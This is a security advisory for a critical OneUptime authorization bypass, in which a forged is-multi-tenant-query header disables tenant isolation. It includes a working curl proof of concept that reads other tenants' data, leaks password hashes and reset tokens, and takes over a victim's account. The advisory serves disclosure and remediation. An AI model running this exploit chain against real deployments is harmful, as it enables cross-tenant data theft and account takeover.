# [C] OneUptime has authorization bypass via client‑controlled is-multi-tenant-query header that leads to cross‑tenant data exposure and account takeover

## Summary
Severity: Critical
Advisory: GHSA-r5v6-2599-9g3m
CVE: CVE-2026-30956
CWE: CWE-285, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-r5v6-2599-9g3m
Type: github-advisory

## Affected
- npm: `@oneuptime/common` — affected >=0 <10.0.21

## Details
### Summary
A low‑privileged user can bypass authorization and tenant isolation in OneUptime `v10.0.20` by sending a forged `is-multi-tenant-query` header together with a controlled `projectid` header.

Because the server trusts this client-supplied header, internal permission checks in `BasePermission` are skipped and tenant scoping is disabled.

This allows attackers to:

1. Access project data belonging to other tenants
2. Read sensitive User fields via nested relations
3. Leak plaintext resetPasswordToken
4. Reset the victim’s password and fully take over the account

This results in cross‑tenant data exposure and full account takeover.

### Details

Root cause

The API trusts a client‑controlled header to determine whether a request should bypass authorization checks.

CommonAPI.ts
```
if (req.headers["is-multi-tenant-query"]) {
  props.isMultiTenantRequest = true;
}
```
BasePermission.ts
```
if (!props.isMultiTenantRequest) {
  TablePermission.checkTableLevelPermissions(...)
  QueryPermission.checkQueryPermission(...)
  SelectPermission.checkSelectPermission(...)
}
```
When the attacker sends:
```
is-multi-tenant-query: true
```
the system skips all authorization checks including:

- Table permission validation
- Query permission validation
- Select permission validation
- Tenant isolation enforcement

Additionally, tenant scoping is disabled in `TenantPermission`

Sensitive user data exposure

Projects marked with:
```
@MultiTenentQueryAllowed(true)
```
allow cross-tenant queries when the header is present.

The Project model contains a relation:
```
createdByUser
```
Because select permission checks are skipped, attackers can retrieve sensitive fields from the User model including:
```
password
resetPasswordToken
webauthnChallenge
```

Reset token stored in plaintext

In the password reset flow:

Authentication.ts
```
resetPasswordToken: token
```
The reset token is stored in plaintext in the database.

During password reset:
```
/api/identity/reset-password
```
the server validates the provided token directly.

If an attacker leaks this token through the authorization bypass, they can immediately reset the victim’s password.

Exploitation chain

1. Attacker bypasses tenant isolation using is-multi-tenant-query
2. Attacker reads victim project
3. Attacker selects createdByUser.resetPasswordToken
4. Attacker triggers forgot-password for victim
5. Attacker retrieves the fresh token via the same query
6. Attacker calls /api/identity/reset-password
7. Attacker sets a new password
8. Attacker logs in as victim

This results in full account takeover.

### PoC

**Setup:**
- Local OneUptime v10.0.20 instance
- Two normal accounts:
  - Attacker account owns Project A (`7cb77c45-c2e0-42b5-8a28-57aa0dec6e82`)
  - Victim account owns Project B (`88ced36b-4c0a-4c12-bdf1-497d60b10b23`) with email `victim@example.com`

---

#### Chain 1: Direct Project Isolation Bypass

**1. Read isolation bypass**

```bash
curl -X POST http://localhost/api/project/get-list \
  -H "authorization: Bearer <attacker_token>" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{
        "query": {},
        "select": {
            "_id": true,
            "name": true,
            "createdOwnerEmail": true
        }
      }'
```
Result: Returns both the attacker's and victim's projects:
```json
{
  "data": [
    {
      "_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23",
      "name": "Victim Project",
      "createdOwnerEmail": { "value": "victim@example.com" }
    },
    {
      "_id": "7cb77c45-c2e0-42b5-8a28-57aa0dec6e82",
      "name": "Attacker Project",
      "createdOwnerEmail": { "value": "attacker@example.com" }
    }
  ],
  "count": 2
}
```
2. Write isolation bypass

Victim project name is initially: Victim Project ORIGINAL
```
curl -X POST http://localhost/api/project/88ced36b-4c0a-4c12-bdf1-497d60b10b23/update-item \
  -H "authorization: Bearer <attacker_token>" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{"name":"Victim Project EXPLOIT"}'
```
Result: Victim project name is updated to "Victim Project EXPLOIT" despite the attacker not being a member of the victim project.

#### Chain 2: Account Takeover via Credential Leakage

3. Trigger password reset for victim
```
curl -X POST http://localhost/api/identity/forgot-password \
  -H "content-type: application/json" \
  -d "{\"email\":\"victim@example.com\"}"
```
4. Leak victim password hash and reset token via tenant bypass
```
curl -X POST http://localhost/api/project/get-list \
  -H "authorization: Bearer <attacker_token>" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{
        "query": {"_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23"},
        "select": {
          "_id": true,
          "createdByUser": {
            "email": true,
            "password": true,
            "resetPasswordToken": true
          }
        }
      }'
```
Result: Sensitive user data is exposed:
```
{
  "data": [{
    "_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23",
    "createdByUser": {
      "email": {"value": "victim@example.com"},
      "password": {"value": "faef08e8f2b9e9dfa09c15dfaf043b8aad7761d9712c7e09417d4da2156e33d9"},
      "resetPasswordToken": "4b75e6d0-1aca-11f1-b2d4-698549b693fb"
    }
  }]
}
```
5. Take over victim account using leaked token
```
# Reset password with leaked token
curl -X POST http://localhost/api/identity/reset-password \
  -H "content-type: application/json" \
  -d '{
    "resetPasswordToken": "4b75e6d0-1aca-11f1-b2d4-698549b693fb",
    "password": "AttackerChosenPassword123!"
  }'

# Login as victim with new password
curl -X POST http://localhost/api/identity/login \
  -H "content-type: application/json" \
  -d '{
    "email": "victim@example.com",
    "password": "AttackerChosenPassword123!"
  }'
```
Result: Successful login with attacker-chosen password, original password fails - complete account takeover achieved.



Result: Victim project name is updated despite the attacker not being a member of the victim project.
### Impact
This vulnerability allows a low‑privileged authenticated user to:

- bypass tenant isolation
- access other tenant projects
- read sensitive user credential fields
- leak plaintext reset tokens
- reset victim passwords
- fully take over victim accounts

Because OneUptime is a multi‑tenant monitoring platform, this allows attackers to compromise any tenant account in the system.

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-r5v6-2599-9g3m
- https://nvd.nist.gov/vuln/detail/CVE-2026-30956
- https://github.com/OneUptime/oneuptime
- https://github.com/OneUptime/oneuptime/releases/tag/10.0.21
